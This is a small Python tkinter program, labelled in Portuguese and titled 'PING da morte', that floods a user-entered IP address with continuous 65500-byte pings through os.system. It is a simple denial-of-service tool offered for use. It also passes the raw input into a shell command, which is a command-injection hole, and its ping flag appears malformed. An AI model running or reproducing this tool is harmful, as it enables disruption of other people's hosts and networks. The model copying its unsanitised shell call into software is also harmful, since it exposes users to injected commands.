import os
from os import system

from tkinter import*
def clique():
    ping = entrada.get()
    os.system("ping -l- 65500 -t {}" .format(ping))

janela = Tk()
janela.geometry("400x300+400+200")
janela.title('PING da morte')


info = Label(janela, text="Digite o IP")
info.place(x=100, y = 80)

entrada = Entry(janela)
entrada.place(x=100, y=100)

botao = Button(janela, text="iniciar", width=20, command=clique)
botao.place(x=100, y =130)

janela.mainloop()
